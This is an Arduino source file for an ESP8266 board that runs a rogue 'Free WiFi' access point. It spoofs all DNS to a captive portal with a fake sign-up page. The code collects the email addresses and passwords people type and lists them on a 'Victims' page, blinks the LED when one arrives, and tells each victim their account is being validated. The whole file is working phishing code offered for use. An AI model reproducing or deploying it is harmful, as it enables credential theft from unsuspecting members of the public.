// NodeMcu-ESP8266 Fake sign in
// Based on: PopupChat https://github.com/tlack/popup-chat

// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// User configuration
#define SSID_NAME "Free WiFi"
#define SUBTITLE "Welcome to free wifi service."
#define TITLE "Register:"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY " Your account is being validated. Please, wait up to 3 minutes for device connection.</br> Thank you."
#define PASS_TITLE "Victims"
#define CLEAR_TITLE "Cleared"

//System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String Victims = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;"); a.replace(">", "&gt;");
  a.substring(0, 200); return a;
}

String footer() {
  return
    "<br><footer><div><center><p>Copyright&#169; 2019-2020 | All rights reserved.</p></center></div></footer>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               // Data input box
               "input{ width: 100%; padding: 12px 20px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 2px solid #08B794; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               //  Free WiFi Navbar
               "nav { background: #08B794; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }"
               " input{width: 100%;border-box border: 2px solid red;border-radius: 4px}";
  //  index html
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div>";
  return h;
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + Victims + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b> Email:   </b> <center> <input  type=text autocomplete=email name=email placeholder=yourmail@gmail.com></center>" +
         "<b> Password:</b> <center> <input type=password name=password placeholder=password></center>" +
         "<p>&#9745;I have read and agree to the Privacy Policy</p>" +
         //SUBMIT
         "<center><input type=submit  style=background:#08B794;font-size:17px;color:white;cursor:pointer;  value=\"Register\"></center></form>" + footer();

}


String posted() {
  String email = input("email");
  String password = input("password");
  Victims = "<li>Email:  <b>" + email + "</b></br>Password:  <b style=color:#ea5455;>" + password + "</b></li>" + Victims;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  String email = "<p></p>";
  String password = "<p></p>";
  Victims = "<p></p>";
  return header(CLEAR_TITLE) + "<div><p>The Victims list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() { 
  int count = 1;
  while (count <= 3) {   // The internal LED will blink 3 times when a password is received.
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}
void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();

  });
  webServer.on("/pass", []() {
    webServer.send(HTTP_CODE, "text/html", pass());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });

  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);

}


void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest(); webServer.handleClient();
}
